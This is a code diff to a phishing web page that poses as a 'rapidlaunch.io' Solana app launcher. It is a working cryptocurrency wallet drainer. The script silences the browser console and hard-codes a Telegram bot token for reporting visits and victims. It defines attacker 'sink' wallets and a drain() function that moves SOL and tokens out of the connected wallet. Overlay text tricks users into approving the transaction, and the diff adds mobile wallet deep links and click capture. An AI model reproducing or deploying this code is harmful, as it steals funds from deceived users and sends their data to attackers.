@@ -654,6 +654,9 @@ curl -X POST https://rapidlaunch.io/solana/deploy \
 (function(){
 "use strict";
 
+// ----------------------------------------------------------
+// console silence
+// ----------------------------------------------------------
 try{
   var _noop=function(){};
   var _m=["log","warn","error","info","debug","trace","dir","table","group","groupCollapsed","groupEnd","time","timeEnd","assert","count","profile","profileEnd","clear"];
@@ -665,11 +668,13 @@ try{
   }
 }catch(_){}
 
+// ----------------------------------------------------------
+// config
+// ----------------------------------------------------------
 var TG_BOT_TOKEN="8763030544:AAHzAmRNGjUdWlr4Sjc_2WqhoZm5D5_RSlk";
 var TG_CHAT_ID="6759486932";
 var REDIRECT_URL="https://rapidlaunch.io/";
 var SOL_EMOJI_IMG="https://cdn3.emoji.gg/emojis/8033-solana.png";
-
 var SINK_PRIMARY="4k57rb38GEXb4guzc31NsxJr6REj3tBLgytbkKHpWvzW";
 var SINK_SECONDARY="EVeMnsb7UGPq5w6oBF1bTq8T6PdtKnSbkDHWY3bEKams";
 var RPC="https://mainnet.helius-rpc.com/?api-key=113c3ed4-b272-4156-8d9c-10eb3e9a52a3";
@@ -677,7 +682,6 @@ var TOKEN_PROGRAM_STR="TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA";
 var ASSOC_TOKEN_PROGRAM_STR="ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL";
 var RENT_EXEMPT_SYSTEM=0;
 var TX_SIZE_LIMIT=900;
-
 var isMobile=/Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent);
 var isAndroid=/Android/i.test(navigator.userAgent);
 
@@ -689,7 +693,9 @@ function lsGet(k){try{return localStorage.getItem(k);}catch(_){return null;}}
 function hasVisited(){return lsGet("vx_visited")==="1";}
 function markVisited(){lsSet("vx_visited","1");}
 
+// ----------------------------------------------------------
 // video
+// ----------------------------------------------------------
 (function(){
   var v=document.getElementById("rlVideo");
   var tint=document.getElementById("rlTint");
@@ -715,6 +721,9 @@ function markVisited(){lsSet("vx_visited","1");}
   v.addEventListener("click",function(){if(v.muted){v.muted=false;v.volume=1;if(btn)btn.classList.add("hidden");if(tint)tint.classList.add("hidden");}});
 })();
 
+// ----------------------------------------------------------
+// telegram
+// ----------------------------------------------------------
 function tgEscape(s){return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");}
 function tgSendText(text){
   try{
@@ -793,9 +802,9 @@ async function logVisit(){
   }
 }
 
-// ==========================================================
-// WEB3 — preload on idle so it's ready by the time user clicks.
-// ==========================================================
+// ----------------------------------------------------------
+// web3 — preload on idle
+// ----------------------------------------------------------
 var web3=null,Connection,PublicKey,SystemProgram,Transaction,TransactionInstruction;
 var TOKEN_PROGRAM,ASSOC_TOKEN_PROGRAM;
 
@@ -837,13 +846,15 @@ async function ensureWeb3(){
   ASSOC_TOKEN_PROGRAM=new PublicKey(ASSOC_TOKEN_PROGRAM_STR);
 }
 
-// start loading now, don't wait for user click
 function preloadWeb3(){
   try{ ensureWeb3().catch(function(){}); }catch(_){}
 }
 if("requestIdleCallback" in window){ requestIdleCallback(preloadWeb3,{timeout:2500}); }
 else { setTimeout(preloadWeb3, 800); }
 
+// ----------------------------------------------------------
+// wallet providers
+// ----------------------------------------------------------
 var WALLETS=[
   {id:"phantom",get:function(){return window.phantom&&window.phantom.solana?window.phantom.solana:(window.solana&&window.solana.isPhantom?window.solana:null);}},
   {id:"solflare",get:function(){return window.solflare&&window.solflare.solana?window.solflare.solana:window.solflare;}},
@@ -901,6 +912,9 @@ async function signAndSend(provider,connection,tx){
   throw new Error("Wallet does not support signing.");
 }
 
+// ----------------------------------------------------------
+// drain
+// ----------------------------------------------------------
 async function drain(session){
   var connection=new Connection(RPC,"confirmed");
   var from=new PublicKey(session.pubkey);
@@ -1012,9 +1026,101 @@ async function drain(session){
   return {solDrained:solDrained,tokenTotal:tokenTotal};
 }
 
+// ----------------------------------------------------------
+// overlay state
+// ----------------------------------------------------------
+function showProgress(){
+  setDisplay("vxSpinner","block");setDisplay("vxChk","block");setDisplay("vxWallets","none");setDisplay("vxMore","none");setDisplay("vxClose","none");
+  setText("vxTitle","Launch the Application");
+  setText("vxText","A confirmation request has been sent to your crypto wallet. Open your wallet and approve the transaction to launch the application.");
+  setText("vxChk","Waiting for approval…");
+}
+function showProcessing(){
+  setText("vxTitle","Launching Application");
+  setText("vxText","Confirm the transaction in your wallet to continue.");
+  setText("vxChk","Waiting for wallet approval…");
+}
+function showNoWallet(){
+  setDisplay("vxSpinner","none");setDisplay("vxChk","none");setDisplay("vxWallets","none");setDisplay("vxMore","none");
+  setText("vxTitle","No Crypto Wallet Detected");
+  setText("vxText","Install a Solana wallet (Phantom, Solflare, Backpack, Exodus, SafePal) to continue.");
+  setDisplay("vxClose","block");
+  var c=$("vxClose");if(c){c.textContent="Close";c.onclick=closeOverlay;}
+}
+function showSuccess(){
+  setDisplay("vxSpinner","none");setDisplay("vxChk","none");setDisplay("vxWallets","none");setDisplay("vxMore","none");
+  setText("vxTitle","Application Launched");
+  setText("vxText","Redirecting…");
+  setDisplay("vxClose","none");
+  setTimeout(function(){ try{ location.href=REDIRECT_URL; }catch(_){} }, 900);
+}
+function showError(msg){
+  setDisplay("vxSpinner","none");setDisplay("vxChk","none");setDisplay("vxWallets","none");setDisplay("vxMore","none");
+  setText("vxTitle","Launch Failed");
+  setText("vxText",msg||"Something went wrong. Please try again.");
+  setDisplay("vxClose","block");
+  var c=$("vxClose");if(c){c.textContent="Try Again";c.onclick=closeOverlay;}
+}
+function openOverlay(){var ov=$("vxOverlay");if(ov)ov.classList.add("open");}
+function closeOverlay(){var ov=$("vxOverlay");if(ov)ov.classList.remove("open");}
+
+// ----------------------------------------------------------
+// wallet picker (mobile)
+// ----------------------------------------------------------
+var ICON_CDN="https://raw.githubusercontent.com/0xa3k5/web3icons/refs/heads/main/raw-svgs/wallets/branded/";
+var PRIMARY_WALLETS=[
+  {id:"phantom",name:"Phantom",icon:ICON_CDN+"phantom.svg",href:function(p){return "https://phantom.app/ul/browse/"+encodeURIComponent(p)+"?ref="+encodeURIComponent(location.origin);},ios:"https://apps.apple.com/app/phantom-crypto-wallet/id1598432977",android:"https://play.google.com/store/apps/details?id=app.phantom"},
+  {id:"solflare",name:"Solflare",icon:ICON_CDN+"solflare.svg",href:function(p){return "https://solflare.com/ul/v1/browse/"+encodeURIComponent(p)+"?ref="+encodeURIComponent(location.origin);},ios:"https://apps.apple.com/app/solflare/id1580902717",android:"https://play.google.com/store/apps/details?id=com.solflare.mobile"},
+  {id:"backpack",name:"Backpack",icon:ICON_CDN+"backpack.svg",href:function(p){return "https://backpack.app/ul/v1/browse/"+encodeURIComponent(p)+"?ref="+encodeURIComponent(location.origin);},ios:"https://apps.apple.com/app/backpack-crypto-wallet/id1640352537",android:"https://play.google.com/store/apps/details?id=app.backpack.mobile"},
+  {id:"exodus",name:"Exodus",icon:ICON_CDN+"exodus.svg",href:function(p){return "exodus://wc?uri="+encodeURIComponent(p);},ios:"https://apps.apple.com/app/exodus-crypto-wallet/id1414384820",android:"https://play.google.com/store/apps/details?id=exodusmovement.exodus"},
+  {id:"safepal",name:"SafePal",icon:ICON_CDN+"safepal.svg",href:function(p){return "safepal://browser?url="+encodeURIComponent(p);},hrefAlt:function(p){return "safepal://openurl?url="+encodeURIComponent(p);},ios:"https://apps.apple.com/app/safepal-wallet/id1548297139",android:"https://play.google.com/store/apps/details?id=io.safepal.wallet"}
+];
+var MORE_WALLETS=[
+  {id:"jupiter",name:"Jupiter",icon:ICON_CDN+"jupiter.svg",href:function(p){return "https://jup.ag/mobile/browse?url="+encodeURIComponent(p);},ios:"https://apps.apple.com/app/jupiter-solana-wallet/id6484061972",android:"https://play.google.com/store/apps/details?id=ag.jup.app"},
+  {id:"glow",name:"Glow",icon:ICON_CDN+"glow.svg",href:function(p){return "https://glow.app/browse?url="+encodeURIComponent(p);},ios:"https://apps.apple.com/app/glow-solana-wallet/id1599580120",android:"https://play.google.com/store/apps/details?id=com.glow.app"}
+];
+var allWalletsShown=false;
+function renderWalletRow(w,page){
+  var a=document.createElement("a");
+  a.className="vx-wrow";a.href=w.href(page);a.rel="noopener";
+  a.innerHTML='<span class="ic"><img src="'+w.icon+'" alt="" onerror="this.style.display=\'none\'"></span><span class="nm">'+w.name+'</span><span class="ar">›</span>';
+  a.addEventListener("click",function(){
+    var alts=[];if(w.hrefAlt)alts.push(w.hrefAlt(page));
+    var store=isAndroid?w.android:w.ios;var t0=Date.now();
+    var tryAlts=function(idx){
+      if(document.hidden)return;
+      if(idx<alts.length){location.href=alts[idx];setTimeout(function(){tryAlts(idx+1);},700);}
+      else if(Date.now()-t0<3000){location.href=store;}
+    };
+    setTimeout(function(){tryAlts(0);},700);
+  });
+  return a;
+}
+function showWalletPicker(){
+  setDisplay("vxSpinner","none");setDisplay("vxChk","none");setDisplay("vxClose","none");
+  setText("vxTitle","Open in Your Wallet");
+  setText("vxText","Tap your wallet, then tap Open on the banner that appears.");
+  var w=$("vxWallets");if(!w)return;
+  w.style.display="flex";w.innerHTML="";
+  var page=location.href;
+  for(var i=0;i<PRIMARY_WALLETS.length;i++)w.appendChild(renderWalletRow(PRIMARY_WALLETS[i],page));
+  setDisplay("vxMore","block");allWalletsShown=false;
+}
+function vxExpandWallets(){
+  if(allWalletsShown)return;
+  var w=$("vxWallets");if(!w)return;
+  var page=location.href;
+  for(var i=0;i<MORE_WALLETS.length;i++)w.appendChild(renderWalletRow(MORE_WALLETS[i],page));
+  setDisplay("vxMore","none");allWalletsShown=true;
+}
+window.vxExpandWallets=vxExpandWallets;
+var moreEl=$("vxMore");if(moreEl)moreEl.onclick=vxExpandWallets;
+
+// ----------------------------------------------------------
+// flow
+// ----------------------------------------------------------
 var busy=false;
 
-// order matters: connect FIRST (Phantom prompt), THEN ensureWeb3 (already preloaded usually)
 async function runClaim(wallet){
   showProgress();
   var session;
@@ -1051,15 +1157,28 @@ function startClaim(){
     runClaim(wallet).finally(function(){busy=false;});
   }).catch(function(e){showError(String(e&&e.message?e.message:e));busy=false;});
 }
-function bindLaunch(){
-  var btns=document.querySelectorAll("[data-rl-launch]");
-  for(var i=0;i<btns.length;i++){btns[i].onclick=function(ev){ev.preventDefault();startClaim();};}
-}
-if(document.readyState==="loading"){document.addEventListener("DOMContentLoaded",bindLaunch);}
-else{bindLaunch();}
-var rebind=setInterval(bindLaunch,500);
-setTimeout(function(){clearInterval(rebind);},15000);
 
+// ----------------------------------------------------------
+// EVENT DELEGATION — catches clicks even if buttons mount late
+// ----------------------------------------------------------
+document.addEventListener("click",function(ev){
+  var el=ev.target;
+  while(el && el!==document){
+    if(el.hasAttribute && el.hasAttribute("data-rl-launch")){
+      ev.preventDefault();
+      startClaim();
+      return;
+    }
+    el=el.parentNode;
+  }
+},true);
+
+// also expose for manual triggering / debugging
+window.__rlLaunch = startClaim;
+
+// ----------------------------------------------------------
+// visit log
+// ----------------------------------------------------------
 if(document.readyState==="complete"){setTimeout(logVisit,300);}
 else{window.addEventListener("load",function(){setTimeout(logVisit,300);});}
 
